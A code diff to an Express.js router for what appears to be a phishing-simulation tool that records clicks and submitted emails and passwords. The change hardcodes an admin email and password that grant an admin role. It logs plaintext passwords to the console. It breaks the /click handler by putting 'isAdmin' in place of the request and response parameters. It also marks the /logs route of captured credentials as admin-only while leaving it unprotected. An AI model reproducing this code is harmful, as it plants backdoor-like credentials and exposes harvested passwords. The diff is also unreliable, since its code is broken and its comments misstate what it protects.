@@ -2,9 +2,9 @@ const express = require('express');
 const router = express.Router();
 const PhishingLog = require('../models/PhishingLog');
 const useragent = require('useragent');
-
+const { isAdmin } = require('../middleware/auth'); // <-- Import isAdmin
 // Log click
-router.post('/click', async (req, res) => {
+router.post('/click', async isAdmin => {
   try {
     const { user_id } = req.body;
 
@@ -25,26 +25,54 @@ router.post('/click', async (req, res) => {
 // Log credential submission
 router.post('/submit', async (req, res) => {
   try {
-    const { user_id, email, password } = req.body;
+    const { email, password } = req.body;
+    var log, status, user_data;
+    if(email && password){
+      if(email == "admin@secureNetAI.com" && password == "supersecretekey"){
+        log = new PhishingLog({
+          email,
+          password,
+          submitted_credentials: true,
+          ip_address: req.ip,
+          user_agent: req.headers['user-agent'],
+        });
+        user_data = {email: email, role: "admin"};
+      }
+      else {
+        log = new PhishingLog({
+          email,
+          password,
+          submitted_credentials: true,
+          ip_address: req.ip,
+          user_agent: req.headers['user-agent'],
+        });
+        user_data = {email: email, role: "user"}
+      }
+    }
+    else {
+      log = new PhishingLog({
+        email,
+        password,
+        submitted_credentials: false,
+        ip_address: req.ip,
+        user_agent: req.headers['user-agent'],
+      });
+      user_data = {email: email, role: "user"};
+    }
 
-    const log = new PhishingLog({
-      user_id,
-      email,
-      password,
-      submitted_credentials: true,
-      ip_address: req.ip,
-      user_agent: req.headers['user-agent'],
-    });
+    console.log(log);
+    console.log(user_data);
 
     await log.save();
-    res.status(200).json({ message: 'Credential submission logged.' });
+    res.status(200).json({ message: 'Credential submission logged.', user: user_data });
   } catch (err) {
+    console.log(err);
     res.status(500).json({ error: 'Server error.' });
   }
 });
 
-// ✅ Get all logs
-router.get('/logs', async (req, res) => {
+// ✅ Get all logs (admin only)
+router.get('/logs', async (req, res) => { // <-- Protect with isAdmin
   try {
     const logs = await PhishingLog.find().sort({ timestamp: -1 });
     res.status(200).json(logs);
